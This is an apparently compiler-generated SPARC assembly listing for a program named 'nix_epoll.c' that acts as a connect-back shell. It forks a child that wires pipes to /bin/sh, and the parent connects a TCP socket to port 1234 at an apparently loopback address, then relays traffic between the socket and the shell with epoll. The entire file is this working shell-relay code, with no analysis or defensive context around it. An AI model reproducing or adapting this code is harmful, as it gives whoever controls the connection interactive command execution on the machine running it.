	.file	"nix_epoll.c"
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC0:
	.asciz	"/bin/sh"
	.section	.text.startup,"ax",@progbits
	.align 4
	.global main
	.type	main, #function
	.proc	04
main:
	.register	%g2, #scratch
	.register	%g3, #scratch
	sethi	%hi(8192), %g1
	xor	%g1, -272, %g1
	save	%sp, %g1, %sp
	add	%fp, 2047, %g1
	add	%fp, 2047, %g2
	sethi	%hi(8192), %i5
	xor	%i5, -96, %i1
	add	%g1, %i1, %l3
	sethi	%hi(16777216), %g1
	or	%g1, 127, %g1
	sethi	%hi(_GLOBAL_OFFSET_TABLE_-4), %l7
	call	__sparc_get_pc_thunk.l7
	 add	%l7, %lo(_GLOBAL_OFFSET_TABLE_+4), %l7
	stx	%g1, [%g2+%i1]
	xor	%i5, -88, %i2
	add	%g2, %i2, %i3
	call	pipe, 0
	 mov	%i3, %o0
	add	%fp, 2047, %g1
	xor	%i5, -80, %l0
	add	%g1, %l0, %i4
	call	pipe, 0
	 mov	%i4, %o0
	call	fork, 0
	 nop
	cmp	%o0, 0
	bne,pt	%icc, .L2
	 mov	%o0, %l1
	add	%fp, 2047, %g2
	mov	0, %o1
	call	dup2, 0
	 ldsw	[%g2+%i2], %o0
	mov	1, %o1
	call	dup2, 0
	 ldsw	[%i4+4], %o0
	xor	%i5, -64, %i5
	mov	2, %o1
	call	dup2, 0
	 ldsw	[%i4+4], %o0
	add	%fp, 2047, %g3
	call	close, 0
	 ldsw	[%g3+%i2], %o0
	call	close, 0
	 ldsw	[%i3+4], %o0
	add	%fp, 2047, %g1
	call	close, 0
	 ldsw	[%g1+%l0], %o0
	call	close, 0
	 ldsw	[%i4+4], %o0
	add	%fp, 2047, %g2
	sethi	%gdop_hix22(.LC0), %o0
	add	%g2, %i5, %o1
	xor	%o0, %gdop_lox10(.LC0), %o0
	stx	%g0, [%o1+8]
	ldx	[%l7 + %o0], %o0, %gdop(.LC0)
	mov	0, %o2
	call	execve, 0
	 stx	%o0, [%g2+%i5]
	add	%fp, 2047, %g2
.L14:
	sethi	%hi(8192), %i5
	xor	%i5, -88, %g1
	add	%g2, %g1, %g1
	call	close, 0
	 ldsw	[%g1+4], %o0
	add	%fp, 2047, %g3
	xor	%i5, -80, %i5
	mov	0, %i0
	call	close, 0
	 ldsw	[%g3+%i5], %o0
	return	%i7+8
	 nop
.L2:
	add	%fp, 2047, %g1
	call	close, 0
	 ldsw	[%g1+%i2], %o0
	call	close, 0
	 ldsw	[%i4+4], %o0
	mov	0, %o2
	mov	1, %o1
	call	socket, 0
	 mov	2, %o0
	xor	%i5, -16, %g1
	add	%fp, 2047, %g2
	add	%fp, 2047, %g3
	add	%g2, %g1, %o1
	mov	2, %g2
	sth	%g2, [%g3+%g1]
	mov	1234, %g1
	sth	%g1, [%o1+2]
	lduw	[%g3+%i1], %g1
	st	%g1, [%o1+4]
	lduw	[%l3+4], %g1
	mov	16, %o2
	st	%g1, [%o1+8]
	mov	%o0, %i0
	call	connect, 0
	 mov	%o0, %l2
	call	epoll_create1, 0
	 mov	0, %o0
	orcc	%o0, 0, %l3
	ble,pn	%icc, .L4
	 mov	%o0, %i1
	add	%fp, 2047, %g3
	xor	%i5, -72, %g1
	add	%g3, %g1, %g2
	lduw	[%i4], %i2
	st	%i0, [%g3+%g1]
	xor	%i5, -48, %l4
	st	%i2, [%g2+4]
	add	%g3, %l4, %i4
	mov	1, %l5
	mov	%i4, %o3
	st	%l5, [%g3+%l4]
	st	%i0, [%i4+8]
	mov	%i0, %o2
	call	epoll_ctl, 0
	 mov	1, %o1
	st	%i2, [%i4+8]
	add	%fp, 2047, %g3
	mov	%i4, %o3
	st	%l5, [%g3+%l4]
	sra	%i2, 0, %o2
	mov	1, %o1
	call	epoll_ctl, 0
	 mov	%i1, %o0
	xor	%i5, -32, %i4
	add	%fp, 2047, %g1
	sra	%l3, 0, %l3
	add	%g1, %i4, %i4
	sub	%g1, %i5, %i2
	sra	%i0, 0, %l4
	mov	-1, %o3
.L13:
	mov	1, %o2
	mov	%i4, %o1
	call	epoll_wait, 0
	 mov	%l3, %o0
	cmp	%o0, 0
	ble,pn	%icc, .L15
	 add	%fp, 2047, %g2
	lduw	[%i4], %g1
	andcc	%g1, 24, %g0
	bne,pn	%icc, .L15
	 andcc	%g1, 1, %g0
	be,pn	%xcc, .L16
	 mov	%i5, %o2
	lduw	[%i4+8], %g1
	cmp	%l2, %g1
	bne,pt	%icc, .L6
	 mov	%i2, %o1
	call	read, 0
	 mov	%l4, %o0
	mov	%i2, %o1
	sra	%o0, 0, %o2
	ldsw	[%i3+4], %o0
.L12:
	call	write, 0
	 nop
	ba,pt	%xcc, .L13
	 mov	-1, %o3
.L6:
	add	%fp, 2047, %g3
	call	read, 0
	 ldsw	[%g3+%l0], %o0
	sra	%o0, 0, %o2
	mov	%i2, %o1
	ba,pt	%xcc, .L12
	 mov	%l4, %o0
.L15:
.L16:
	sethi	%hi(8192), %g1
	xor	%g1, -72, %g1
	mov	0, %o3
	add	%g2, %g1, %i5
	ldsw	[%g2+%g1], %o2
	mov	2, %o1
	call	epoll_ctl, 0
	 mov	%i1, %o0
	mov	0, %o3
	ldsw	[%i5+4], %o2
	mov	2, %o1
	call	epoll_ctl, 0
	 mov	%i1, %o0
	call	close, 0
	 mov	%i1, %o0
.L4:
	mov	20, %o1
	call	kill, 0
	 mov	%l1, %o0
	call	close, 0
	 mov	%i0, %o0
	ba,pt	%xcc, .L14
	 add	%fp, 2047, %g2
	.size	main, .-main
	.ident	"GCC: (Debian 6.3.0-19) 6.3.0 20170618"
	.section	.text.__sparc_get_pc_thunk.l7,"axG",@progbits,__sparc_get_pc_thunk.l7,comdat
	.align 4
	.weak	__sparc_get_pc_thunk.l7
	.hidden	__sparc_get_pc_thunk.l7
	.type	__sparc_get_pc_thunk.l7, #function
	.proc	020
__sparc_get_pc_thunk.l7:
	jmp	%o7+8
	 add	%o7, %l7, %l7
	.section	.note.GNU-stack,"",@progbits
